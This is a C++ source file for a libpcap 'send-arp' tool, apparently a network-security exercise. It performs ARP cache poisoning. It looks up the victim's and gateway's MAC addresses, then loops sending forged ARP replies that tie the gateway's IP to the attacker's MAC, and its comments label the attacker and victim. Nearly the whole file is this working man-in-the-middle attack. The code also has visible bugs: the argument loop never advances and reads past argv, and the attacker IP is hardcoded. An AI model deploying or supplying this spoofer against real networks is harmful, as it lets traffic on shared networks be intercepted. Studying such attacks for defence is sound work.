#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"
#include <unistd.h>
#include <string>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// get my ip by mac
string get_mac_address(const char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return "";

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return "";
    }

    close(sock);

    char mac[18];
    snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             (uint8_t)ifr.ifr_hwaddr.sa_data[0],
             (uint8_t)ifr.ifr_hwaddr.sa_data[1],
             (uint8_t)ifr.ifr_hwaddr.sa_data[2],
             (uint8_t)ifr.ifr_hwaddr.sa_data[3],
             (uint8_t)ifr.ifr_hwaddr.sa_data[4],
             (uint8_t)ifr.ifr_hwaddr.sa_data[5]);
    return string(mac);
}

// Send ARP Request and get mac.
Mac get_mac_by_arp_reply(pcap_t* pcap, Ip my_ip, Mac my_mac, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
        fprintf(stderr, "Failed to send ARP request: %s\n", pcap_geterr(pcap));
        exit(1);
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res <= 0) continue;

        const EthArpPacket* arp_reply = reinterpret_cast<const EthArpPacket*>(recv_packet);

        
       if (ntohs(arp_reply->arp_.op_) == ArpHdr::Reply &&
            ntohl(arp_reply->arp_.sip_) == target_ip &&
            ntohl(arp_reply->arp_.tip_) == my_ip) {
            return arp_reply->arp_.smac_;
        }

        
    }
}

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
    printf("sample : send-arp eth0 192.168.0.10 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        usage();
        return -1;
    }

    const char* dev = argv[1];
    for(int i=2;i<=argc;i+2){
        Ip sender_ip(argv[i]);
        Ip target_ip(argv[i+1]);

        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (pcap == nullptr) {
            fprintf(stderr, "pcap_open_live(%s) failed: %s\n", dev, errbuf);
            return -1;
        }

        string my_mac_str = get_mac_address(dev);
        if (my_mac_str.empty()) {
            fprintf(stderr, "Failed to get MAC address for %s\n", dev);
            return -1;
        }

        Mac my_mac(my_mac_str);
        Ip my_ip("172.20.10.7"); // input attacker ip

        Mac sender_mac = get_mac_by_arp_reply(pcap, my_ip, my_mac, sender_ip);
        Mac gateway_mac = get_mac_by_arp_reply(pcap, my_ip, my_mac, target_ip);

        printf("Sender MAC:  %s\n", static_cast<string>(sender_mac).c_str());
        printf("Gateway MAC: %s\n", static_cast<string>(gateway_mac).c_str());

        //  ARP Reply
        EthArpPacket packet;
        packet.eth_.dmac_ = sender_mac;
        packet.eth_.smac_ = my_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::Size;
        packet.arp_.pln_ = Ip::Size;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = my_mac;               // attacker MAC
        packet.arp_.sip_ = htonl(target_ip);      // gateway IP
        packet.arp_.tmac_ = sender_mac;           // victim MAC
        packet.arp_.tip_ = htonl(sender_ip);      // victim IP

        printf("Start...\n");

        while (true) {
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
            if (res != 0) {
                fprintf(stderr, "Failed to send ARP reply: %s\n", pcap_geterr(pcap));
            } else {
                printf("%s\n", static_cast<string>(my_mac).c_str());
            }
            sleep(1);
        }
        pcap_close(pcap);
    }

    
    return 0;
}

